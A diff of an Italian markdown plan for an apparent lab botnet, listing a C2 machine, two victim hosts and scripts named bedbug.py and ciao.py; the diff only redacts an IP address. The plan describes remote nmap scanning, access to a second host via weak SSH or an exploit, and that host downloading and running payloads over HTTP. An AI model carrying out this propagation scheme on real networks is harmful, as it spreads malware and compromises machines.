@@ -5,7 +5,7 @@
 | Ruolo | Machine | IP | Script |
 |-------|---------|-----|--------|
 | sergio | cs20 | C2_IP | `sergio.py` |
-| Vittima 1 / Seed | cs33 | 192.168.1.x | `bedbug.py` + `ciao.py` |
+| Vittima 1 / Seed | cs33 | capybara-redacted | `bedbug.py` + `ciao.py` |
 | Vittima 2 | cs23 (default - Arch Linux CT) | BOT2_IP | `bedbug.py` + `ciao.py` |
 
 ## Script
@@ -41,7 +41,7 @@
 [6] cs20 invia comando a cs33: "nmap -sV LOCAL_SUBNET"
 [7] cs33 scopre cs23 a BOT2_IP
     vettore di accesso (SSH debole / exploit / altro):
-      -> cs23 scarica bedbug.py da http://192.168.1.x:9090/bedbug.py
+      -> cs23 scarica bedbug.py da http://capybara-redacted:9090/bedbug.py
       -> cs23 esegue bedbug.py
 [8] cs23 scarica ciao.py da cs20:8081 (o dal seed piu vicino)
 [9] cs23 avvia ciao.py:
